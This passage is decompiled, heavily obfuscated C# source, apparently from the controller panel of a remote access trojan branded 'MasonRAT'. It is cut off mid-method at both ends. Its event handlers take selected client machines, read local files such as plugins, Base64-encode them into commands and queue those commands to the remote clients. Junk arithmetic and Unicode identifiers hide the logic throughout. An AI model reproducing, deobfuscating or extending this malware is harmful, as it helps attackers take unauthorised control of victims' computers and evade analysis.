    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1626), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1627) + Conversions.ToString(this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1628), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1629), (822490722 - 214967222 % 1244856538 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + -((922279628 > 1133537269 ? 810031334 : 607523501) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, ((835609659 ^ 1630601867 % 668634486) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + -(1890943909 + (549099515 << 91866076) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0);
    if (str.Length != 0)
    {
      try
      {
        string[] strArray = new string[(1438574918 % 871313374 - 1079094890 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - -((1509065430 >> 1350453216) - 997232077 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1630);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1750750534 - (1071527346 >> 1618510426) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + -(1456530082 + 294220435 % 418717131 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1631)));
        strArray[(-254501187 - -254501209 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ 1798618564 - 1798618543 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1633382397 - 1633382376 % 2138061292 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ 291700462 - 1852461875 % 1560761430 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = str.Split((char) (((1938764919 > 1938918185 ? 11505185 : 8628889) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ (-1366636214 - (1279557695 | 1593755077) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % (1231997686 - 900510924 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)))[0];
        strArray[(-1308622843 /*0xB2000005*/ - (1351574216 << 567184950) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ -675995634 - 1871851482 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << ((-1511100344 ^ ~2011966441) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((-1395933068 ^ ~1978351501) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ -1019638003 - 1543848271 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << (1461773552 - (1561499892 >> 1853551006) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = str.Split((char) ((-1380448197 - (1779484640 | 1821330836) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > 1815091441 - 494560754 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? 1496116535 - 1496116458 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 : (1969118722 > 1852327626 ? 58 : 77) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)))[1];
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cۚ\u060Fـ\u0609ـ\u060Eڇ\u0608ـ\u060Aڙۛا\u060Aئــ\u0608\u060A(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1632));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u060F\u0608ۭ\u0020ڜٻ\u060Aحڙ\u060Fڙڼ\u0608\u060Aٺد\u060C(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1633) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1634));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۡ\u060Fٸــمٺۡـڙ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count > 1)
    {
      int num1 = (int) MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1635));
    }
    else if (Operators.CompareString(this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items[this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.FocusedItem.Index].SubItems[((1485308799 - 125371145 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) > 1528430294 - 1346812508 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? -712023228 - -712023236 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : (1319212238 | 937883660) - 2145909956 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)].Text, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1636), false) == 0)
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1637));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    else
    {
      int num2 = (int) MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1638));
    }
  }

  private void \u2694️MasonRAT\u270Cڟــۡٻٺ\u060B\u0609ڙۙٻدﯧـ\u0608\u060D\u060A(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1639) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1640))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cبژـ؁\u0608ــ\u0608ــ\u060Bٺطدּژٻ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1641) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1642))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u060F\u060D\u060B\u060Cحة\u060Aٺــ̨ــ\u060E(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1643));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cــڙټـ\u060C\u0020\u0020ـڠ\u0608(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string[] strArray = new string[((1357007566 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 > (1454558219 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ? (2 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 : (877050518 << 2106111413) - 1388314619 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1644);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
